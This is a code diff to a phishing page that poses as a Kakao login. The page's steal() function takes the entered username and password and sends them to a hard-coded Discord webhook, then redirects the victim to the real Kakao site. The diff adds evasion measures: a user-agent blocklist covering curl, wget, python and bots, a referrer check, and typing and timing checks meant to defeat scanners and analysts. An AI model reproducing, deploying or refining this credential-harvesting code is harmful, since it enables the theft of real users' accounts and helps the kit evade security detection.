@@ -150,32 +150,64 @@ body {
     </div>
   </div>
 
-  <script>
-    function steal(e) {
-      e.preventDefault();
-      const u = document.getElementById("username").value;
-      const p = document.getElementById("password").value;
+<script>
+  const startTime = Date.now();
+  let typed = false;
 
-      fetch("https://discord.com/api/webhooks/1358102599647232202/4L51fQpmCq7hnbVud6P2AoYXGkpIrt2dYOts15JgJUb9LiEMeIxJJF5AdmDfJxtHlwFd", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `🛑 강아지\nUsername: ${u}\nPassword: ${p}`
-        })
-      })
-      .then(response => {
-        if (response.ok) {
-          setTimeout(() => {
-            window.location.href = "https://www.kakaocorp.com";
-          }, Math.random() * 2000 + 1000);
-        } else {
-          alert('Something went wrong.');
-        }
-      })
-      .catch(() => {
-        alert('Network error.');
-      });
+  // User-Agent blocklist (very basic)
+  const ua = navigator.userAgent.toLowerCase();
+  const bots = ['curl', 'wget', 'python', 'bot', 'spider', 'httpclient'];
+  const isBot = bots.some(agent => ua.includes(agent));
+  if (isBot) {
+    console.log("Bot detected. Exiting.");
+    throw new Error("Blocked");
+  }
+
+  // Referrer check
+  if (!document.referrer || !document.referrer.includes("kakao")) {
+    console.log("Invalid referrer. Exiting.");
+    throw new Error("Blocked");
+  }
+
+  // Detect real typing
+  document.querySelectorAll(".input-field").forEach(field => {
+    field.addEventListener("input", () => {
+      typed = true;
+    });
+  });
+
+  function steal(e) {
+    e.preventDefault();
+
+    // Delay + typing check
+    if (!typed || (Date.now() - startTime < 3000)) {
+      console.log("Suspicious interaction. Exiting.");
+      return;
     }
-  </script>
+
+    const u = document.getElementById("username").value;
+    const p = document.getElementById("password").value;
+
+    fetch("https://discord.com/api/webhooks/1358102599647232202/4L51fQpmCq7hnbVud6P2AoYXGkpIrt2dYOts15JgJUb9LiEMeIxJJF5AdmDfJxtHlwFd", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `🛑 강아지\nUsername: ${u}\nPassword: ${p}`
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        setTimeout(() => {
+          window.location.href = "https://www.kakaocorp.com";
+        }, Math.random() * 2000 + 1000);
+      } else {
+        alert('Something went wrong.');
+      }
+    })
+    .catch(() => {
+      alert('Network error.');
+    });
+  }
+</script>
 </body>
 </html>
